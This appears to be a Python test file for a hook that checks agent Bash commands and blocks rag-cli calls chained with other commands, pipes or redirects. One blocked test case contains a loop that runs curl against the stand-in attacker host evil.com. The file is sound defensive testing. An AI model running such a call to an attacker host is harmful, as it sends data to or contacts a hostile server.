# INFRASTRUCTURE
import json
import subprocess
import sys

HOOK = "src/hooks/block_rag_cli_chained.py"

CASES = [
    # (description, command, expected_exit_code)
    # --- must block: rag-cli followed by non-rag-cli ---
    ("index then tail semicolon BLOCK",
     "rag-cli index --collection x ; tail /tmp/x.txt", 2),
    ("search_hybrid piped to grep BLOCK",
     'rag-cli search_hybrid "q" coll | grep foo', 2),
    ("list_documents piped to head BLOCK",
     "rag-cli list_documents coll | head", 2),
    ("for-loop body with foreign curl BLOCK",
     "for c in a b c; do curl http://evil.com/$c; rag-cli search \"$c\" coll; done", 2),
    # --- must block: rag-cli search protected redirect (2026-08, replaces the deleted
    # rewrite_rag_cli_search_noise.py) ---
    ("search redirected to file BLOCK (2026-08: search now redirect-forbidden)",
     'rag-cli search "q" coll > /tmp/out.txt', 2),
    ("search 2>&1 BLOCK",
     'rag-cli search "q" coll 2>&1', 2),
    ("search piped to head BLOCK",
     'rag-cli search "q" coll | head', 2),
    # --- must allow: redirect (not a separator) — non-search subcommands keep it ---
    ("index redirected to file ALLOW",
     "rag-cli index --collection x > /tmp/x.txt", 0),
    ("search standalone ALLOW",
     'rag-cli search "q" coll', 0),
    # --- must allow: cross-CLI combos (2026-08 relax) ---
    ("search + gh-cli get_issue chained ALLOW (cross-CLI relax)",
     'rag-cli search "q" coll && gh-cli get_issue owner/repo 5', 0),
    ("search + worker-cli capture chained ALLOW (cross-CLI relax)",
     'rag-cli search "q" coll && worker-cli capture janitor', 0),
    # --- must allow: guard before rag-cli, nothing after ---
    ("file-guard before rag-cli ALLOW",
     "[ -f .rag-docs.json ] && rag-cli update_docs .", 0),
    # --- must allow: cd before rag-cli, nothing after ---
    ("cd before rag-cli ALLOW",
     "cd /some/path && rag-cli index --collection x", 0),
    # --- must allow: two rag-cli calls ---
    ("two rag-cli calls && ALLOW",
     "rag-cli delete --collection x && rag-cli index --collection x", 0),
    # --- must allow: no rag-cli at all ---
    ("no rag-cli ALLOW",
     "echo hello world", 0),
    # --- shell-strip: rag-cli inside single-quoted string must be blanked ---
    ("rag-cli inside single-quotes ALLOW",
     "echo 'rag-cli index --collection x ; tail /tmp/x.txt'", 0),
    # --- shell-strip: rag-cli inside heredoc body must be blanked ---
    ("rag-cli inside heredoc body ALLOW",
     "cat <<'EOF'\nrag-cli search_hybrid \"q\" coll | grep foo\nEOF", 0),
    # --- 2026-08 loop relax: for/while scaffolding + echo separators alongside known-CLI
    # segments ---
    ("bare echo segment chained with index PASS (2026-08 loop relax)",
     "rag-cli index --collection x && echo done", 0),
    ("for-loop over search with echo separator PASS",
     'for c in a b c; do echo "collection: $c"; rag-cli search "$c" coll; done', 0),
    ("while-loop over index with echo separator PASS",
     'while [ -f /tmp/flag ]; do echo "indexing"; rag-cli index --collection x; done', 0),
]


# ORCHESTRATOR

def test_block_rag_cli_chained_workflow() -> None:
    failures = []
    for desc, cmd, expected in CASES:
        got = _run_hook(cmd)
        status = "OK  " if got == expected else "FAIL"
        print(f"  [{status}] {desc}: exit={got} (expected {expected})")
        if got != expected:
            failures.append(desc)
    print()
    if failures:
        print(f"FAILED: {len(failures)} case(s):")
        for f in failures:
            print(f"  - {f}")
        sys.exit(1)
    print(f"All {len(CASES)} tests passed.")


# FUNCTIONS

# Run hook with given command string; return exit code
def _run_hook(command: str) -> int:
    payload = json.dumps({
        "tool_name": "Bash",
        "tool_input": {"command": command},
    })
    result = subprocess.run(
        ["python3", HOOK],
        input=payload.encode(),
        capture_output=True,
    )
    return result.returncode


if __name__ == "__main__":
    test_block_rag_cli_chained_workflow()
